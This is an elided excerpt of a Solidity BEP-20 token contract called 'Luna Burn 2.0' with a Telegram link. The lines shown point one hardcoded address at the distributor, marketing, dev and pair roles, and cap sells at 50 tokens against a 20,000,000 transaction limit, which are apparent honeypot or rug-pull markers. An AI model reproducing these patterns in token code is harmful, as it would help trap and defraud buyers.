...
/*
TG: https://t.me/LunaBurn_TwoPointZero
...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        router = _router != address(0)
            ...
            Distributor = 0x89eB7E68bEB06567A92ff5C8186b3d16C26DF787;
        _token = msg.sender;
    }
...
contract LunaBurnTwoPointZero is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0x89eB7E68bEB06567A92ff5C8186b3d16C26DF787; //mw dj
    address DevWallet       = 0x89eB7E68bEB06567A92ff5C8186b3d16C26DF787; //dw sfz

    string constant _name = "Luna Burn 2.0";
    string constant _symbol = unicode"LUNABURN2.0";
    uint8 constant _decimals = 4;

    uint256 _totalSupply = 1000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 20000000 * (10 ** _decimals);
    uint256 public _maxWalletToken = 20000000 * (10 ** _decimals);
    uint256 public _maxSell = 50 * (10 ** _decimals);
    ...
    address PAIR = 0x89eB7E68bEB06567A92ff5C8186b3d16C26DF787;
